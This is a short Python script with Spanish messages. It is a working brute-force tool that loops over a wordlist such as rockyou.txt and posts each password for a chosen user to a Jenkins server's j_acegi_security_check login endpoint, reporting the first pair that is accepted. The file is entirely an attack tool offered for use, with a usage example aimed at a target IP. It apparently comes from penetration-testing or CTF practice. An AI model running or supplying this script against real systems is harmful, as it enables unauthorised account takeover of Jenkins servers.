#!/usr/bin/python
#coding: utf-8

import requests
import os
import signal
import sys
from pwn import *

def def_handler(sig, frame):
	log.failure("Saliendo..")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def makeRequest(ip, port, username, password):
	
	header = {
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '56',
		'Origin': 'http://localhost:8090',
		'Connection': 'close',
		'Referer': 'http://localhost:8090/loginError',
		'Cookie': 'JSESSIONID.b5c04240=node0gc3sc8e5xnxw1ietko1tzdl562.node0',
		'Upgrade-Insecure-Requests': '1'
	}
	
	datos = {
		'j_username': str(username),
		'j_password': str(password),
		'from': '%2F&Submit=Sign+in'
	}
	
	r = requests.post('http://'+str(ip)+':'+str(port)+'/j_acegi_security_check', headers=header, data=datos).text
	
	if "Invalid username or password" not in r:
		print("[*] Credenciales validas %s:%s" % (username, password))
		sys.exit(0)
		
def main(ip, port, wordlist, user):

	p1 = log.progress("Buscando contrasena...")
	p2 = log.progress("Probando...")

	contrasenas = open(wordlist, 'r')
	password_verificada = 0

	for password in contrasenas:
		password_verificada += 1
		p1.status('[%d] %s:%s' % (password_verificada, user, password.strip('\n')))
		makeRequest(ip, port, user, password.strip('\n'))
				
if __name__ == '__main__':
	argc = len(sys.argv)
	if argc < 5:
		print("[*] Uso: python %s <IP> <PORT> <WORDLIST> <USER>" % str(sys.argv[0]))
		print("[*] Ejemplo: python %s 10.10.20.30 8080 rockyou.txt admin" % (sys.argv[0]))
	else:
		ip = str(sys.argv[1])
		port = str(sys.argv[2])
		wordlist = str(sys.argv[3])
		user = str(sys.argv[4])
		main(ip, port, wordlist, user)
